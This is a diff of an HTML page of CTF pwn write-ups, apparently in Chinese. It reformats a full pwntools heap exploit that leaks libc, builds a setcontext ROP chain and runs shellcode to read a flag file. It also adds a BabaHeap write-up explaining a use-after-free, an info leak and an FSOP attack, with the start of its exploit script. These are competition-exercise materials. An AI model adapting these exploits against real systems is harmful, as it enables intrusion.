@@ -162,6 +162,8 @@
     
                 <a class="dropdown-item" href="#naiveheap">naiveheap</a>
     
+                <a class="dropdown-item" href="#babaheap">babaheap</a>
+    
                 <a class="dropdown-item" href="#kbrop">kbrop</a>
     
               </div>
@@ -265,6 +267,10 @@
     
 <a href="#naiveheap" class="list-group-item list-group-item-action text-white bg-dark">
               <span class="menu-collapsed">naiveheap</span>
+            </a>
+    
+<a href="#babaheap" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babaheap</span>
             </a>
     
 <a href="#kbrop" class="list-group-item list-group-item-action text-white bg-dark">
@@ -525,159 +531,194 @@ irt()</code></pre><h3 id="secure-jit-ii"><a class="header-link" href="#secure-ji
 <li>重复利用tache结构体构造overlap。</li>
 <li>修改size获得unsorted bin，partial write unsorted bin的fd把main_arena的bitsmap当作head。</li>
 <li>一路往下写写到stdout，泄露libc，之后free_hook进行rop。</li>
-<li>上一部分往下覆盖路过一个指针，如果指针指向内容不能读就会segfault，可以通过写另一个 fake size，然后利用free往上面打一个tcache的结构体地址，这样保证了那个地址可读
-<code>`</code>python
-from pwn import *</li>
+<li>上一部分往下覆盖路过一个指针，如果指针指向内容不能读就会segfault，可以通过写另一个 fake size，然后利用free往上面打一个tcache的结构体地址，这样保证了那个地址可读</li>
 </ol>
-<p>context.log_level = &#39;debug&#39;
-context.arch = &#39;amd64&#39;</p>
-<h1 id="io-=-process('./chall',-aslr=false)"><a class="header-link" href="#io-=-process('./chall',-aslr=false)"></a>io = process(&#39;./chall&#39;, aslr=False)</h1>
-<h1 id="io-=-process('./pwn',-aslr=false)"><a class="header-link" href="#io-=-process('./pwn',-aslr=false)"></a>io = process(&#39;./pwn&#39;, aslr=False)</h1>
-<h1 id="io-=-remote('127.0.0.1',-4455)"><a class="header-link" href="#io-=-remote('127.0.0.1',-4455)"></a>io = remote(&#39;127.0.0.1&#39;, 4455)</h1>
-<p>io = remote(&#39;1.117.189.158&#39;, 60001)</p>
-<h1 id="elf-=-elf('./chall')"><a class="header-link" href="#elf-=-elf('./chall')"></a>elf = ELF(&#39;./chall&#39;)</h1>
-<h1 id="libc-=-elf.libc"><a class="header-link" href="#libc-=-elf.libc"></a>libc = elf.libc</h1>
-<p>rl = lambda    a=False        : io.recvline(a)
-ru = lambda a,b=True    : io.recvuntil(a,b)
-rn = lambda x            : io.recvn(x)
-sn = lambda x            : io.send(x)
-sl = lambda x            : io.sendline(x)
-sa = lambda a,b            : io.sendafter(a,b)
-sla = lambda a,b        : io.sendlineafter(a,b)
-irt = lambda            : io.interactive()
-dbg = lambda text=None  : gdb.attach(io, text)
-lg = lambda s,addr        : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s,addr))
-lg = lambda s            : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
-uu32 = lambda data        : u32(data.ljust(4, &#39;\x00&#39;))
-uu64 = lambda data        : u64(data.ljust(8, &#39;\x00&#39;))</p>
-<p>text =&#39;&#39;&#39;heapinfo
-&#39;&#39;&#39;</p>
-<p>def Gift(offset):
-    sl(str(0))
-    sl(offset)</p>
-<p>def Add_Del(size, content):
-    sl(str(1))
+<pre class="hljs"><code>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+context.log_level = <span class="hljs-string">'debug'</span>
+context.arch = <span class="hljs-string">'amd64'</span>
+
+<span class="hljs-comment"># io = process('./chall', aslr=False)</span>
+<span class="hljs-comment"># io = process('./pwn', aslr=False)</span>
+<span class="hljs-comment"># io = remote('127.0.0.1', 4455)</span>
+io = remote(<span class="hljs-string">'1.117.189.158'</span>, <span class="hljs-number">60001</span>)
+<span class="hljs-comment"># elf = ELF('./chall')</span>
+<span class="hljs-comment"># libc = elf.libc</span>
+
+rl = <span class="hljs-keyword">lambda</span>    a=<span class="hljs-keyword">False</span>        : io.recvline(a)
+ru = <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-keyword">True</span>    : io.recvuntil(a,b)
+rn = <span class="hljs-keyword">lambda</span> x            : io.recvn(x)
+sn = <span class="hljs-keyword">lambda</span> x            : io.send(x)
+sl = <span class="hljs-keyword">lambda</span> x            : io.sendline(x)
+sa = <span class="hljs-keyword">lambda</span> a,b            : io.sendafter(a,b)
+sla = <span class="hljs-keyword">lambda</span> a,b        : io.sendlineafter(a,b)
+irt = <span class="hljs-keyword">lambda</span>            : io.interactive()
+dbg = <span class="hljs-keyword">lambda</span> text=<span class="hljs-keyword">None</span>  : gdb.attach(io, text)
+lg = <span class="hljs-keyword">lambda</span> s,addr        : log.info(<span class="hljs-string">'\033[1;31;40m %s --&gt; 0x%x \033[0m'</span> % (s,addr))
+lg = <span class="hljs-keyword">lambda</span> s            : log.info(<span class="hljs-string">'\033[1;31;40m %s --&gt; 0x%x \033[0m'</span> % (s, eval(s)))
+uu32 = <span class="hljs-keyword">lambda</span> data        : u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\x00'</span>))
+uu64 = <span class="hljs-keyword">lambda</span> data        : u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>))
+
+text =<span class="hljs-string">'''heapinfo
+'''</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Gift</span><span class="hljs-params">(offset)</span>:</span>
+    sl(str(<span class="hljs-number">0</span>))
+    sl(offset)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Add_Del</span><span class="hljs-params">(size, content)</span>:</span>
+    sl(str(<span class="hljs-number">1</span>))
     sl(str(size))
-    sl(content)</p>
-<p>Gift(&#39;-&#39;+str(0xa0160/8))
-Gift(str(0))</p>
-<p>Add_Del(0x100, &#39;&#39;)
-Add_Del(0x200, &#39;&#39;)
-Add_Del(0x400, &#39;&#39;)</p>
-<p>paylaod = &#39;\x00&#39;<em>0x18
-paylaod += p64(0x0001000000000000)
-paylaod += &#39;\x00&#39;</em>0x18
-paylaod += p64(0x0001000000000000)
-paylaod += &#39;\x00&#39;<em>0xb8
-paylaod += p16(0x72a0)
-Add_Del(0x280, paylaod)
-Add_Del(0x100, &#39;\x00&#39;</em>0xf0+p64(0)+p32(0x681))</p>
-<p>paylaod = &#39;\x00&#39;<em>0x18
-paylaod += p64(0x0000000100000000)
-paylaod += &#39;\x00&#39;</em>0x18
-paylaod += p64(0x0001000000000000)
-paylaod += &#39;\x00&#39;*0xb0
-paylaod += p16(0x73a0)
-Add_Del(0x280, paylaod)
-Add_Del(0xf0, &#39;&#39;)
-Add_Del(0x1000, &#39;&#39;)</p>
-<p>paylaod = &#39;\x00&#39;<em>0x18
-paylaod += p64(0)
-paylaod += &#39;\x00&#39;</em>0x18
-paylaod += p64(0x0001000000000000)
-paylaod += &#39;\x00&#39;<em>0x138
-paylaod += p16(0x72a0)
-Add_Del(0x280, paylaod)
-Add_Del(0x200, &#39;\x00&#39;</em>0xf0+p64(0)+p32(0x101))</p>
-<p>paylaod = &#39;\x00&#39;<em>0x78
-paylaod += p64(0x0001000000000000)
-paylaod += &#39;\x00&#39;</em>0x1f8
-paylaod += p16(0x73a0)
-Add_Del(0x280, paylaod)
-Add_Del(0x400, &#39;&#39;)</p>
-<p>#
-paylaod = &#39;\x00&#39;<em>0x78
-paylaod += p64(0x0001000000000000)
-paylaod += &#39;\x00&#39;</em>0x1f8
-paylaod += p16(0x33f0)
-Add_Del(0x280, paylaod)</p>
-<p>paylaod = &#39;\x00&#39;*0x100
-paylaod += p64(0) + p64(0x300)
-Add_Del(0x400, paylaod)</p>
-<p>paylaod = &#39;\x00&#39;<em>0x78
-paylaod += p64(0x0000000100000000)
-paylaod += &#39;\x00&#39;</em>0x1f0
-paylaod += p16(0x3500)
-Add_Del(0x280, paylaod)</p>
-<p>paylaod = &#39;\x00&#39;<em>0x1a0
-paylaod += p64(0xfbad1800)
-paylaod += p64(0)</em>3
-paylaod += p16(0x3300)
-Add_Del(0x3f0, paylaod)</p>
-<p>paylaod = &#39;\x00&#39;<em>0x58
-paylaod += p64(0x0000000100000000)
-paylaod += &#39;\x00&#39;</em>0x190
-paylaod += p16(0x5b28)
-Add_Del(0x280, paylaod)</p>
-<p>sl(&#39;0&#39;*0x1000)
-base = uu64(rn(8)) - 0x212ca0
-lg(&#39;base&#39;)</p>
-<p>pause()</p>
-<p>###############</p>
-<h1 id="dbg()"><a class="header-link" href="#dbg()"></a>dbg()</h1>
-<h1 id="pause()"><a class="header-link" href="#pause()"></a>pause()</h1>
-<p>setcontext=0x7ffff7dc60dd-0x7ffff7d6e000+base
-rdx2rdi=0x7ffff7ec2930-0x7ffff7d6e000+base
-address=0x7ffff7f5cb30-0x7ffff7d6e000+base
-rdi=0
-rsi=address+0xc0
-rdx=0x100
-read=0x7ffff7e7f130-0x7ffff7d6e000+base
+    sl(content)
+
+Gift(<span class="hljs-string">'-'</span>+str(<span class="hljs-number">0xa0160</span>/<span class="hljs-number">8</span>))
+Gift(str(<span class="hljs-number">0</span>))
+
+
+Add_Del(<span class="hljs-number">0x100</span>, <span class="hljs-string">''</span>)
+Add_Del(<span class="hljs-number">0x200</span>, <span class="hljs-string">''</span>)
+Add_Del(<span class="hljs-number">0x400</span>, <span class="hljs-string">''</span>)
+
+payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x18</span>
+payload += p64(<span class="hljs-number">0x0001000000000000</span>)
+payload += <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x18</span>
+payload += p64(<span class="hljs-number">0x0001000000000000</span>)
+payload += <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0xb8</span>
+payload += p16(<span class="hljs-number">0x72a0</span>)
+Add_Del(<span class="hljs-number">0x280</span>, payload)
+Add_Del(<span class="hljs-number">0x100</span>, <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0x681</span>))
+
+payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x18</span>
+payload += p64(<span class="hljs-number">0x0000000100000000</span>)
+payload += <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x18</span>
+payload += p64(<span class="hljs-number">0x0001000000000000</span>)
+payload += <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0xb0</span>
+payload += p16(<span class="hljs-number">0x73a0</span>)
+Add_Del(<span class="hljs-number">0x280</span>, payload)
+Add_Del(<span class="hljs-number">0xf0</span>, <span class="hljs-string">''</span>)
+Add_Del(<span class="hljs-number">0x1000</span>, <span class="hljs-string">''</span>)
+
+payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x18</span>
+payload += p64(<span class="hljs-number">0</span>)
+payload += <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x18</span>
+payload += p64(<span class="hljs-number">0x0001000000000000</span>)
+payload += <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x138</span>
+payload += p16(<span class="hljs-number">0x72a0</span>)
+Add_Del(<span class="hljs-number">0x280</span>, payload)
+Add_Del(<span class="hljs-number">0x200</span>, <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0x101</span>))
+
+payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x78</span>
+payload += p64(<span class="hljs-number">0x0001000000000000</span>)
+payload += <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x1f8</span>
+payload += p16(<span class="hljs-number">0x73a0</span>)
+Add_Del(<span class="hljs-number">0x280</span>, payload)
+Add_Del(<span class="hljs-number">0x400</span>, <span class="hljs-string">''</span>)
+
+
+<span class="hljs-comment">#</span>
+payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x78</span>
+payload += p64(<span class="hljs-number">0x0001000000000000</span>)
+payload += <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x1f8</span>
+payload += p16(<span class="hljs-number">0x33f0</span>)
+Add_Del(<span class="hljs-number">0x280</span>, payload)
+
+
+payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x100</span>
+payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x300</span>)
+Add_Del(<span class="hljs-number">0x400</span>, payload)
+
+
+payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x78</span>
+payload += p64(<span class="hljs-number">0x0000000100000000</span>)
+payload += <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x1f0</span>
+payload += p16(<span class="hljs-number">0x3500</span>)
+Add_Del(<span class="hljs-number">0x280</span>, payload)
+
+payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x1a0</span>
+payload += p64(<span class="hljs-number">0xfbad1800</span>)
+payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>
+payload += p16(<span class="hljs-number">0x3300</span>)
+Add_Del(<span class="hljs-number">0x3f0</span>, payload)
+
+payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x58</span>
+payload += p64(<span class="hljs-number">0x0000000100000000</span>)
+payload += <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x190</span>
+payload += p16(<span class="hljs-number">0x5b28</span>)
+Add_Del(<span class="hljs-number">0x280</span>, payload)
+
+
+sl(<span class="hljs-string">'0'</span>*<span class="hljs-number">0x1000</span>)
+base = uu64(rn(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x212ca0</span>
+lg(<span class="hljs-string">'base'</span>)
+
+pause()
+
+
+<span class="hljs-comment">###############</span>
+
+<span class="hljs-comment"># dbg()</span>
+<span class="hljs-comment"># pause()</span>
+
+
+setcontext=<span class="hljs-number">0x7ffff7dc60dd</span><span class="hljs-number">-0x7ffff7d6e000</span>+base
+rdx2rdi=<span class="hljs-number">0x7ffff7ec2930</span><span class="hljs-number">-0x7ffff7d6e000</span>+base
+address=<span class="hljs-number">0x7ffff7f5cb30</span><span class="hljs-number">-0x7ffff7d6e000</span>+base
+rdi=<span class="hljs-number">0</span>
+rsi=address+<span class="hljs-number">0xc0</span>
+rdx=<span class="hljs-number">0x100</span>
+read=<span class="hljs-number">0x7ffff7e7f130</span><span class="hljs-number">-0x7ffff7d6e000</span>+base
 rsp=rsi
-rbp = 153280+base
-leave=371272+base
-struct =p64(address)+p64(0)<em>3+p64(setcontext)
-struct =struct.ljust(0x68, &#39;\x00&#39;)
-struct+=p64(rdi)+p64(rsi)+p64(0)</em>2+p64(rdx)+p64(0)*2+p64(rsp)+p64(read)</p>
-<p>Add_Del(0x2f0, p64(rdx2rdi)+struct)
-rdx = 0x000000000011c371+base# rdx+r12
-sys = 0x7ffff7e7f1e5-0x7ffff7d6e000+base
-rax = 304464+base
-rdi = 158578+base
-rsi = 161065+base
-rcx = 653346+base
-rax_r10 = 0x000000000005e4b7+base</p>
-<p>rop = p64(rdi)
-rop += p64(0xdddd000)
+rbp = <span class="hljs-number">153280</span>+base
+leave=<span class="hljs-number">371272</span>+base
+struct =p64(address)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(setcontext)
+struct =struct.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">'\x00'</span>)
+struct+=p64(rdi)+p64(rsi)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(rdx)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(rsp)+p64(read)
+
+Add_Del(<span class="hljs-number">0x2f0</span>, p64(rdx2rdi)+struct)
+rdx = <span class="hljs-number">0x000000000011c371</span>+base<span class="hljs-comment"># rdx+r12</span>
+sys = <span class="hljs-number">0x7ffff7e7f1e5</span><span class="hljs-number">-0x7ffff7d6e000</span>+base
+rax = <span class="hljs-number">304464</span>+base
+rdi = <span class="hljs-number">158578</span>+base
+rsi = <span class="hljs-number">161065</span>+base
+rcx = <span class="hljs-number">653346</span>+base
+rax_r10 = <span class="hljs-number">0x000000000005e4b7</span>+base
+
+
+rop = p64(rdi)
+rop += p64(<span class="hljs-number">0xdddd000</span>)
 rop += p64(rsi)
-rop += p64(0x1000)
+rop += p64(<span class="hljs-number">0x1000</span>)
 rop += p64(rdx)
-rop += p64(7)
-rop += p64(0)
+rop += p64(<span class="hljs-number">7</span>)
+rop += p64(<span class="hljs-number">0</span>)
 rop += p64(rcx)
-rop += p64(0x22)
-rop += p64(0x7ffff7e89a20-0x7ffff7d6e000+base)
+rop += p64(<span class="hljs-number">0x22</span>)
+rop += p64(<span class="hljs-number">0x7ffff7e89a20</span><span class="hljs-number">-0x7ffff7d6e000</span>+base)
 rop += p64(rax)
-rop += p64(0)
+rop += p64(<span class="hljs-number">0</span>)
 rop += p64(rdi)
-rop += p64(0)
+rop += p64(<span class="hljs-number">0</span>)
 rop += p64(rsi)
-rop += p64(0xdddd000)
+rop += p64(<span class="hljs-number">0xdddd000</span>)
 rop += p64(rdx)
-rop += p64(0x1000)
-rop += p64(0)
+rop += p64(<span class="hljs-number">0x1000</span>)
+rop += p64(<span class="hljs-number">0</span>)
 rop += p64(sys)
-rop += p64(0xdddd000)</p>
-<p>sn(rop.ljust(0x100, &#39;\x00&#39;))</p>
-<p>#context.log_level=&#39;debug&#39;
-sc=&#39;&#39;&#39;
+rop += p64(<span class="hljs-number">0xdddd000</span>)
+
+
+sn(rop.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">'\x00'</span>))
+
+<span class="hljs-comment">#context.log_level='debug'</span>
+sc=<span class="hljs-string">'''
 mov rax,1
 mov rdi,1
 mov rsi,0xdddd300
 mov rdx,0x600
 syscall
-&#39;&#39;&#39;
-fk=&#39;&#39;&#39;
+'''</span>
+fk=<span class="hljs-string">'''
 mov rdi,rax
 mov rax,0
 mov rsi,0xdddd300
@@ -686,49 +727,48 @@ syscall
 mov rax,1
 mov rdi,rax
 syscall
-&#39;&#39;&#39;</p>
-<h1 id="flag-03387efa-0ad7-4aaa-aae0-e44021ad310a"><a class="header-link" href="#flag-03387efa-0ad7-4aaa-aae0-e44021ad310a"></a>flag-03387efa-0ad7-4aaa-aae0-e44021ad310a</h1>
-<h1 id="poc-=-asm(shellcraft.open(b'/home/pwn/'))+asm(shellcraft.getdents64(3,-0xdddd000-+-0x300,-0x600))+asm(sc)"><a class="header-link" href="#poc-=-asm(shellcraft.open(b'/home/pwn/'))+asm(shellcraft.getdents64(3,-0xdddd000-+-0x300,-0x600))+asm(sc)"></a>poc = asm(shellcraft.open(b&#39;/home/pwn/&#39;))+asm(shellcraft.getdents64(3, 0xdddd000 + 0x300, 0x600))+asm(sc)</h1>
-<p>poc = asm(shellcraft.open(b&#39;/home/pwn/flag-03387efa-0ad7-4aaa-aae0-e44021ad310a&#39;))+asm(fk)
-sn(poc)</p>
-<p>pause()</p>
-<p>irt()</p>
+'''</span>
+
+<span class="hljs-comment"># flag-03387efa-0ad7-4aaa-aae0-e44021ad310a</span>
+<span class="hljs-comment"># poc = asm(shellcraft.open(b'/home/pwn/'))+asm(shellcraft.getdents64(3, 0xdddd000 + 0x300, 0x600))+asm(sc)</span>
+poc = asm(shellcraft.open(<span class="hljs-string">b'/home/pwn/flag-03387efa-0ad7-4aaa-aae0-e44021ad310a'</span>))+asm(fk)
+sn(poc)
+
+pause()
+
+irt()</code></pre><h3 id="babaheap"><a class="header-link" href="#babaheap"></a>BabaHeap</h3>
+<p>题目的漏洞点在于 delete 功能未清空 ptr 和 update 功能未检测 use 位，导致可以对释放后的 chunk 进行写入操作。
+另外，题目的读取函数允许我们输入 <code>size - 1</code> 的内容，然后最后一位设置为 <code>\0</code>。</p>
+<p>题目的麻烦点在于信息泄露，这里需要利用到读取函数的置 0 操作，另外题目提供的 release 版本的 libc，没有符号信息，只能凭感觉来调试。
+每个 bin 入链了第一个 chunk 后，该 chunk 的 next 和 prev 也会指向 <code>bin_head - 0x10</code>，利用读取函数，我们能修改到已释放的 chunk 的 <code>next</code>，我们演示一下：</p>
+<ol class="list">
+<li>我们释放掉一个 <code>0x1b0</code> 大小的 chunk，此时它的 next 和 prev 都指向 <code>bin_head - 0x10</code>：
+<img src="https://md.byr.moe/uploads/upload_8eecafe216e9472e967f4481d1e4e0db.png" alt=""></li>
+</ol>
+<ol start="2">
+<li>利用读取函数对该 chunk 进行写入操作：
+<img src="https://md.byr.moe/uploads/upload_97f8954ac6239b08b06d79df59219912.png" alt=""></li>
+</ol>
+<pre class="hljs"><code>此时，我们的 chunk `next` 指向了另一个 bin，恰好是 `0x120` 的 chunk 所在的 `bin_head - <span class="hljs-number">0</span>x10` 的位置。</code></pre><ol start="3">
+<li>我们释放掉 <code>0x120</code> 的 chunk，以使得 <code>0x00007ff51cb4bb00</code> 的位置有合法的 next 和 prev：
+<img src="https://md.byr.moe/uploads/upload_0c95bbe92d11c7318e5aac97c884aea3.png" alt=""></li>
+</ol>
+<ol start="4">
+<li>我们再一次申请这个 <code>0x1b0</code> 的 chunk，那么<code>bin_head</code> 就会指向 <code>0x120</code> 的<code>bin_head - 0x10</code> 的位置。</li>
+<li>我们再申请一个 <code>0x1b0</code>，就可以将 chunk 分配到 <code>0x120</code> 的 <code>bin_head - 0x10</code> 的位置，从而控制住这一片 <code>mal</code> 区域。</li>
+<li>我们只要在 chunk 能够覆盖的区域内的 bin 中，入链一个 chunk，即可得到该 chunk 的地址，进而泄露 libc 基址，以及所有 chunk 地址、mal 地址等信息。</li>
+</ol>
+<p>泄露了 libc 之后，剩下就是常规操作：</p>
+<ol class="list">
+<li>利用 unbin 在 stdout 前伪造合法的 <code>next</code> 和 <code>prev</code></li>
+<li>再利用 unbin，将 stdout 所在的 chunk <strong>合法</strong>地放入 bin-&gt;head 中</li>
+<li>提前布置好 rop_chain，申请 chunk 得到 stdout 并在合适的位置上填写<strong>poc</strong>实现 FSOP，劫持 rip 和 rsp 读取到 flag。</li>
+</ol>
+<p>EXP：</p>
 <pre class="hljs"><code>
-
-<span class="awk"><span class="hljs-comment">### BabaHeap</span>
-题目的漏洞点在于 <span class="hljs-keyword">delete</span> 功能未清空 ptr 和 update 功能未检测 use 位，导致可以对释放后的 chunk 进行写入操作。
-另外，题目的读取函数允许我们输入 `size - <span class="hljs-number">1</span>` 的内容，然后最后一位设置为 `\<span class="hljs-number">0</span>`。
-
-题目的麻烦点在于信息泄露，这里需要利用到读取函数的置 <span class="hljs-number">0</span> 操作，另外题目提供的 release 版本的 libc，没有符号信息，只能凭感觉来调试。
-每个 bin 入链了第一个 chunk 后，该 chunk 的 <span class="hljs-keyword">next</span> 和 prev 也会指向 `bin_head - <span class="hljs-number">0</span>x10`，利用读取函数，我们能修改到已释放的 chunk 的 `<span class="hljs-keyword">next</span>`，我们演示一下：
-<span class="hljs-number">1</span>. 我们释放掉一个 `<span class="hljs-number">0</span>x1b0` 大小的 chunk，此时它的 <span class="hljs-keyword">next</span> 和 prev 都指向 `bin_head - <span class="hljs-number">0</span>x10`：
-![](https:<span class="hljs-regexp">//m</span>d.byr.moe<span class="hljs-regexp">/uploads/u</span>pload_8eecafe216e9472e967f4481d1e4e0db.png)
-
-
-<span class="hljs-number">2</span>. 利用读取函数对该 chunk 进行写入操作：
-![](https:<span class="hljs-regexp">//m</span>d.byr.moe<span class="hljs-regexp">/uploads/u</span>pload_97f8954ac6239b08b06d79df59219912.png)
-
-
-    此时，我们的 chunk `<span class="hljs-keyword">next</span>` 指向了另一个 bin，恰好是 `<span class="hljs-number">0</span>x120` 的 chunk 所在的 `bin_head - <span class="hljs-number">0</span>x10` 的位置。
-<span class="hljs-number">3</span>. 我们释放掉 `<span class="hljs-number">0</span>x120` 的 chunk，以使得 `<span class="hljs-number">0</span>x00007ff51cb4bb00` 的位置有合法的 <span class="hljs-keyword">next</span> 和 prev：
-![](https:<span class="hljs-regexp">//m</span>d.byr.moe<span class="hljs-regexp">/uploads/u</span>pload_0c95bbe92d11c7318e5aac97c884aea3.png)
-
-
-<span class="hljs-number">4</span>. 我们再一次申请这个 `<span class="hljs-number">0</span>x1b0` 的 chunk，那么`bin_head` 就会指向 `<span class="hljs-number">0</span>x120` 的`bin_head - <span class="hljs-number">0</span>x10` 的位置。
-<span class="hljs-number">5</span>. 我们再申请一个 `<span class="hljs-number">0</span>x1b0`，就可以将 chunk 分配到 `<span class="hljs-number">0</span>x120` 的 `bin_head - <span class="hljs-number">0</span>x10` 的位置，从而控制住这一片 `mal` 区域。
-<span class="hljs-number">6</span>. 我们只要在 chunk 能够覆盖的区域内的 bin 中，入链一个 chunk，即可得到该 chunk 的地址，进而泄露 libc 基址，以及所有 chunk 地址、mal 地址等信息。
-
-泄露了 libc 之后，剩下就是常规操作：
-
-<span class="hljs-number">1</span>. 利用 unbin 在 stdout 前伪造合法的 `<span class="hljs-keyword">next</span>` 和 `prev`
-<span class="hljs-number">2</span>. 再利用 unbin，将 stdout 所在的 chunk **合法**地放入 bin-&gt;head 中
-<span class="hljs-number">3</span>. 提前布置好 rop_chain，申请 chunk 得到 stdout 并在合适的位置上填写**poc**实现 FSOP，劫持 rip 和 rsp 读取到 flag。
-
-EXP：
-```python
 <span class="hljs-comment">#encoding:utf-8</span>
-from pwn import *
-import re
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> re
 
 ip = <span class="hljs-string">'1.116.236.251'</span>
 port = <span class="hljs-number">11124</span>
@@ -736,8 +776,8 @@ local = <span class="hljs-number">0</span>
 filename = <span class="hljs-string">'./babaheap'</span>
 libc_name = <span class="hljs-string">'./libc.so.1'</span>
 
-def create_connect():
-    global io, elf, libc
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_connect</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">global</span> io, elf, libc
 
     elf = ELF(filename)
     context(os=elf.os, arch=elf.arch)
@@ -750,27 +790,27 @@ def create_connect():
         io = remote(ip, port)
         libc_name = <span class="hljs-string">'./libc.so.1'</span>
 
-    try:
+    <span class="hljs-keyword">try</span>:
         libc = ELF(libc_name)
-    except:
-        pass
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-keyword">pass</span>
 
-cc = lambda : create_connect()
-s = lambda x : io.send(x)
-sl = lambda x : io.sendline(x)
-sla = lambda x, y: io.sendlineafter(x, y)
-sa = lambda x, y: io.sendafter(x, y)
-g = lambda x: gdb.attach(io, x)
+cc = <span class="hljs-keyword">lambda</span> : create_connect()
+s = <span class="hljs-keyword">lambda</span> x : io.send(x)
+sl = <span class="hljs-keyword">lambda</span> x : io.sendline(x)
+sla = <span class="hljs-keyword">lambda</span> x, y: io.sendlineafter(x, y)
+sa = <span class="hljs-keyword">lambda</span> x, y: io.sendafter(x, y)
+g = <span class="hljs-keyword">lambda</span> x: gdb.attach(io, x)
 
-r = lambda : io.recv(timeout=<span class="hljs-number">1</span>)
-rr = lambda x: io.recv(x, timeout=<span class="hljs-number">1</span>)
-rl = lambda : io.recvline(keepends=False)
-ru = lambda x : io.recvuntil(x)
-ra = lambda : io.recvall(timeout=<span class="hljs-number">1</span>)
-it = lambda : io.interactive()
-cl = lambda : io.close()
+r = <span class="hljs-keyword">lambda</span> : io.recv(timeout=<span class="hljs-number">1</span>)
+rr = <span class="hljs-keyword">lambda</span> x: io.recv(x, timeout=<span class="hljs-number">1</span>)
+rl = <span class="hljs-keyword">lambda</span> : io.recvline(keepends=<span class="hljs-keyword">False</span>)
+ru = <span class="hljs-keyword">lambda</span> x : io.recvuntil(x)
+ra = <span class="hljs-keyword">lambda</span> : io.recvall(timeout=<span class="hljs-number">1</span>)
+it = <span class="hljs-keyword">lambda</span> : io.interactive()
+cl = <span class="hljs-keyword">lambda</span> : io.close()
 
-def regexp_out(data):
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">regexp_out</span><span class="hljs-params">(data)</span>:</span>
     patterns = [
         re.compile(<span class="hljs-string">r'(flag{.*?})'</span>),
         re.compile(<span class="hljs-string">r'xnuca{(.*?)}'</span>),
@@ -782,11 +822,11 @@ def regexp_out(data):
     <span class="hljs-keyword">for</span> pattern <span class="hljs-keyword">in</span> patterns:
         res = pattern.findall(data.decode() <span class="hljs-keyword">if</span> isinstance(data, bytes) <span class="hljs-keyword">else</span> data)
         <span class="hljs-keyword">if</span> len(res) &gt; <span class="hljs-number">0</span>:
-            return str(res[<span class="hljs-number">0</span>])
+            <span class="hljs-keyword">return</span> str(res[<span class="hljs-number">0</span>])
 
-    return None
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">None</span>
 
-def allocate(size, content=<span class="hljs-string">b'callmecro'</span>):
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">allocate</span><span class="hljs-params">(size, content=<span class="hljs-string">b'callmecro'</span>)</span>:</span>
     sla(<span class="hljs-string">b'Command: '</span>, <span class="hljs-string">b'1'</span>)
     sla(<span class="hljs-string">b'Size: '</span>, str(size).encode())
     <span class="hljs-keyword">if</span> size == len(content):
@@ -794,7 +834,7 @@ def allocate(size, content=<span class="hljs-string">b'callmecro'</span>):
     <span class="hljs-keyword">else</span>:
         sla(<span class="hljs-string">b'Content: '</span>, content)
 
-def no_send_allocate(size, content=<span class="hljs-string">b'callmecro'</span>):
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">no_send_allocate</span><span class="hljs-params">(size, content=<span class="hljs-string">b'callmecro'</span>)</span>:</span>
     sla(<span class="hljs-string">b'Command: '</span>, <span class="hljs-string">b'1'</span>)
     sla(<span class="hljs-string">b'Size: '</span>, str(size).encode())
     <span class="hljs-keyword">if</span> size == len(content):
@@ -802,116 +842,116 @@ def no_send_allocate(size, content=<span class="hljs-string">b'callmecro'</span>
     <span class="hljs-keyword">else</span>:
         sl(content)
 
